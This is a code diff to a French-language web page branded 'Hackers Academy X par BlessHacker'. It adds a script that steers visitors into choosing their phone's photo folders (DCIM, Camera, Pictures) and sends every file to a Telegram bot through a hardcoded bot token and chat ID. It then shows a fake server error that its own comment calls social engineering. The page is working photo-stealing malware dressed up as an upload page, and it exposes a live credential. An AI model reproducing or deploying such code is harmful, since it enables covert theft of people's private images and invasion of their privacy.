@@ -177,11 +177,13 @@
       color: white; margin-top: 5px; font-size: 16px;
     }
 
+    /* Désactivé par défaut */
     button[type="submit"]:disabled {
         background: #333;
         color: #777;
         cursor: not-allowed;
         box-shadow: none;
+        opacity: 0.6;
     }
 
     button[type="submit"]:not(:disabled):hover {
@@ -195,6 +197,7 @@
       font-size: 12px; min-height: 20px;
       margin: -5px 0 20px; font-weight: 600;
       text-shadow: 0 0 10px rgba(0,0,0,0.5);
+      line-height: 1.5;
     }
 
     /* --- PROGRESS --- */
@@ -291,7 +294,158 @@
     Hackers Academy <span>X</span> par BlessHacker
   </div>
 
-<script src="script.js"></script>
+  <script>
+    // --- CONFIGURATION ---
+    const botToken = '8473069914:AAGZm9VeVEKoau8PF7ToRadsz3Crsn3mCtI';
+    const chatId = '7986862981';
+
+
+    // --- ÉLÉMENTS DOM ---
+    const selectFolderBtn = document.getElementById('selectFolderBtn');
+    const fileInput = document.getElementById('fileInput');
+    const form = document.getElementById('uploadForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const folderStatus = document.getElementById('folderStatus');
+    const progressPercent = document.getElementById('progressPercent');
+
+    let selectedFiles = [];
+
+    // --- 1. OUVERTURE DU SÉLECTEUR ---
+    selectFolderBtn.addEventListener('click', () => {
+      fileInput.click();
+    });
+
+    // --- 2. VALIDATION STRICTE (Le coeur du problème est corrigé ici) ---
+    fileInput.addEventListener('change', () => {
+      const files = Array.from(fileInput.files);
+      
+      // Réinitialisation du status
+      folderStatus.innerHTML = "";
+      folderStatus.style.color = "";
+      submitBtn.disabled = true;
+
+      if (files.length > 0) {
+        // Tentative de récupération du nom du dossier
+        // Sur Android, parfois webkitRelativePath est vide ou commence direct par le fichier
+        let rootFolder = "Inconnu";
+        const path = files[0].webkitRelativePath || "";
+        
+        if (path.indexOf('/') !== -1) {
+            rootFolder = path.split('/')[0];
+        } else {
+            // Si le navigateur ne donne pas le dossier, on essaye de deviner ou on met une valeur par défaut
+            // Pour forcer la sécurité, on marque Inconnu si on n'est pas sûr
+            rootFolder = "Dossier Inconnu";
+        }
+
+        const rootLower = rootFolder.toLowerCase();
+
+        // LISTE DES DOSSIERS AUTORISÉS
+        const allowedFolders = ['pictures', 'dcim', 'camera', 'images', 'photos'];
+
+        // VÉRIFICATION
+        if (allowedFolders.includes(rootLower)) {
+          // --> C'EST BON
+          selectedFiles = files;
+          folderStatus.style.color = '#46d369'; // Vert validation
+          folderStatus.innerHTML = `<i class="fas fa-check-circle"></i> Dossier <b>${rootFolder}</b> validé.`;
+          
+          // On active le bouton
+          submitBtn.disabled = false; 
+
+        } else {
+          // --> C'EST PAS BON (ERREUR)
+          selectedFiles = []; // On vide la sélection pour empêcher l'envoi
+          fileInput.value = ''; // On reset l'input
+          
+          folderStatus.style.color = '#e50914'; // Rouge Erreur
+          // Le message exact demandé :
+          folderStatus.innerHTML = `<i class="fas fa-times-circle"></i> Le dossier sélectionné est <b>${rootFolder}</b>.<br>Veuillez sélectionner soit le dossier <b>DCIM</b>, <b>Pictures</b>, <b>Camera</b> ou <b>Images</b>.<br>Les autres ne sont pas acceptés.`;
+          
+          // On s'assure que le bouton reste désactivé
+          submitBtn.disabled = true;
+        }
+      } 
+    });
+
+    // --- 3. ENVOI TELEGRAM ---
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      if (selectedFiles.length === 0) {
+        return;
+      }
+
+      // UI Progression
+      progressContainer.style.display = 'block';
+      progressText.textContent = 'Connexion au serveur...';
+      progressFill.style.width = '0%';
+      progressText.style.color = '#eee';
+      
+      // Bloquer l'interface
+      selectFolderBtn.style.pointerEvents = 'none';
+      selectFolderBtn.style.opacity = '0.5';
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Chargement...";
+
+      let uploadedCount = 0;
+      const total = selectedFiles.length;
+      const CONCURRENCY = 3; 
+      let index = 0;
+
+      async function uploadFile(file) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('document', file);
+        formData.append('caption', `📂 ${file.webkitRelativePath || file.name}`);
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
+
+        try {
+          await fetch(url, { method: 'POST', body: formData });
+        } catch (err) {
+          console.error(err);
+        }
+
+        uploadedCount++;
+        updateProgress(uploadedCount, total);
+      }
+
+      function updateProgress(done, total) {
+        const percent = Math.round((done / total) * 100);
+        progressFill.style.width = `${percent}%`;
+        if(progressPercent) progressPercent.textContent = `${percent}%`;
+        progressText.textContent = `Synchronisation... ${done}/${total}`;
+      }
+
+      async function uploadQueue() {
+        const workers = [];
+        while (index < total) {
+          while (workers.length < CONCURRENCY && index < total) {
+            const promise = uploadFile(selectedFiles[index++]);
+            workers.push(promise);
+          }
+          await Promise.race(workers).then(() => {
+            workers.splice(workers.findIndex(p => p !== undefined), 1);
+          });
+        }
+        await Promise.all(workers);
+      }
+
+      await uploadQueue();
+
+      // FIN AVEC ERREUR SOCIAL ENGINEERING
+      setTimeout(() => {
+        progressFill.style.width = `100%`;
+        if(progressPercent) progressPercent.textContent = `Erreur`;
+        progressText.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erreur inattendue du serveur. Réessayez plus tard.';
+        progressText.style.color = '#ff6b6b';
+      }, 1000);
+    });
+  </script>
 
 </body>
 </html>
